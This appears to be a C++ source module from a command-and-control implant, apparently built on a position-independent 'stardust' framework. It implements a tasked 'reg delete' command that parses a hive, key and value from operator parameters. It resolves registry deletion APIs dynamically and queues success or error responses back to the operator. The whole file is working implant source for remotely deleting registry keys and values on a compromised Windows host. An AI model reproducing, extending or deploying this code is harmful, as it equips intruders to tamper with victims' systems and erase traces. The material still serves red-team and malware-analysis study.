#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_REG_DELETE

using namespace stardust;
using namespace starburst;

static auto declfn parse_hive_del( instance& inst, char* hive_str ) -> HKEY {
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKLM" ) ) ) == 0 ||
         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_LOCAL_MACHINE" ) ) ) == 0 )
        return HKEY_LOCAL_MACHINE;
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCU" ) ) ) == 0 ||
         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_CURRENT_USER" ) ) ) == 0 )
        return HKEY_CURRENT_USER;
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCR" ) ) ) == 0 )
        return HKEY_CLASSES_ROOT;
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKU" ) ) ) == 0 )
        return HKEY_USERS;
    return nullptr;
}

typedef LSTATUS (WINAPI *fn_RegDeleteValueA)( HKEY, LPCSTR );
typedef LSTATUS (WINAPI *fn_RegDeleteKeyA)( HKEY, LPCSTR );

auto declfn starburst::cmd_reg_delete(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t hive_len = 0;
    auto hive_str = parser_string( params, &hive_len );
    uint32_t key_len = 0;
    auto key_str = parser_string( params, &key_len );
    uint32_t val_len = 0;
    auto val_str = parser_string( params, &val_len );

    if ( !hive_str || hive_len == 0 || !key_str || key_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "need hive and key" ) ) );
        return;
    }

    char hive_buf[64] = { 0 };
    memory::copy( hive_buf, hive_str, hive_len < 63 ? hive_len : 63 );
    char key_buf[512] = { 0 };
    memory::copy( key_buf, key_str, key_len < 511 ? key_len : 511 );
    char val_buf[256] = { 0 };
    if ( val_str && val_len > 0 )
        memory::copy( val_buf, val_str, val_len < 255 ? val_len : 255 );

    HKEY hive = parse_hive_del( inst, hive_buf );
    if ( !hive ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid hive" ) ) );
        return;
    }

    if ( val_str && val_len > 0 ) {
        // Delete a value: open key, then delete value
        HKEY h_key = nullptr;
        LSTATUS status = inst.advapi32.RegOpenKeyExA(
            hive, key_buf, 0, KEY_SET_VALUE, &h_key );
        if ( status != ERROR_SUCCESS ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "RegOpenKeyExA failed" ) ) );
            return;
        }

        auto pRegDeleteValueA = reinterpret_cast<fn_RegDeleteValueA>(
            inst.kernel32.GetProcAddress(
                (HMODULE)inst.advapi32.handle,
                symbol<LPCSTR>( "RegDeleteValueA" ) ) );
        if ( !pRegDeleteValueA ) {
            inst.advapi32.RegCloseKey( h_key );
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "RegDeleteValueA not found" ) ) );
            return;
        }

        status = pRegDeleteValueA( h_key, val_buf );
        inst.advapi32.RegCloseKey( h_key );

        if ( status == ERROR_SUCCESS ) {
            queue_response( inst, task_uuid, RESPONSE_SUCCESS,
                symbol<char*>( const_cast<char*>( "Value deleted" ) ) );
        } else {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "RegDeleteValueA failed" ) ) );
        }
    } else {
        // Delete a key
        auto pRegDeleteKeyA = reinterpret_cast<fn_RegDeleteKeyA>(
            inst.kernel32.GetProcAddress(
                (HMODULE)inst.advapi32.handle,
                symbol<LPCSTR>( "RegDeleteKeyA" ) ) );
        if ( !pRegDeleteKeyA ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "RegDeleteKeyA not found" ) ) );
            return;
        }

        LSTATUS status = pRegDeleteKeyA( hive, key_buf );

        if ( status == ERROR_SUCCESS ) {
            queue_response( inst, task_uuid, RESPONSE_SUCCESS,
                symbol<char*>( const_cast<char*>( "Key deleted" ) ) );
        } else {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "RegDeleteKeyA failed" ) ) );
        }
    }
}

#endif
